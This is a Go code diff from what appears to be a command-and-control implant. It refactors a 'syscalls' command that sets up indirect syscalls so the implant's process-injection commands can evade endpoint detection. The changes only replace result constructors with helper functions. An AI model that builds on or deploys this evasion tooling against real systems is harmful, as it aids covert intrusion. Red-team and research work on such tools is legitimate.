@@ -25,7 +25,7 @@ func (c *SyscallsCommand) Execute(task structs.Task) structs.CommandResult {
 	var params syscallsParams
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-			return structs.CommandResult{Output: fmt.Sprintf("Error parsing parameters: %v", err), Status: "error", Completed: true}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 	if params.Action == "" {
@@ -40,7 +40,7 @@ func (c *SyscallsCommand) Execute(task structs.Task) structs.CommandResult {
 	case "init":
 		return c.initSyscalls()
 	default:
-		return structs.CommandResult{Output: fmt.Sprintf("Unknown action: %s. Use: status, list, init", params.Action), Status: "error", Completed: true}
+		return errorf("Unknown action: %s. Use: status, list, init", params.Action)
 	}
 }
 
@@ -68,12 +68,12 @@ func (c *SyscallsCommand) status() structs.CommandResult {
 		output.WriteString("\nInjection commands will use indirect syscalls (calls originate from ntdll).\n")
 	}
 
-	return structs.CommandResult{Output: output.String(), Status: "success", Completed: true}
+	return successResult(output.String())
 }
 
 func (c *SyscallsCommand) list() structs.CommandResult {
 	if !IndirectSyscallsAvailable() {
-		return structs.CommandResult{Output: "Indirect syscalls not initialized. Use 'syscalls init' first.", Status: "error", Completed: true}
+		return errorResult("Indirect syscalls not initialized. Use 'syscalls init' first.")
 	}
 
 	entries := GetResolvedSyscalls()
@@ -108,16 +108,16 @@ func (c *SyscallsCommand) list() structs.CommandResult {
 		output.WriteString(fmt.Sprintf("%-40s  %6d  %s  %s\n", s.name, s.entry.Number, stubStatus, gadgetAddr))
 	}
 
-	return structs.CommandResult{Output: output.String(), Status: "success", Completed: true}
+	return successResult(output.String())
 }
 
 func (c *SyscallsCommand) initSyscalls() structs.CommandResult {
 	if IndirectSyscallsAvailable() {
-		return structs.CommandResult{Output: "Indirect syscalls already initialized.", Status: "success", Completed: true}
+		return successResult("Indirect syscalls already initialized.")
 	}
 
 	if err := InitIndirectSyscalls(); err != nil {
-		return structs.CommandResult{Output: fmt.Sprintf("Error initializing indirect syscalls: %v", err), Status: "error", Completed: true}
+		return errorf("Error initializing indirect syscalls: %v", err)
 	}
 
 	entries := GetResolvedSyscalls()
@@ -128,9 +128,5 @@ func (c *SyscallsCommand) initSyscalls() structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("[+] Indirect syscalls initialized: %d Nt* functions resolved, %d stubs active\n[+] Injection commands will now use indirect syscalls", len(entries), stubbed),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("[+] Indirect syscalls initialized: %d Nt* functions resolved, %d stubs active\n[+] Injection commands will now use indirect syscalls", len(entries), stubbed)
 }
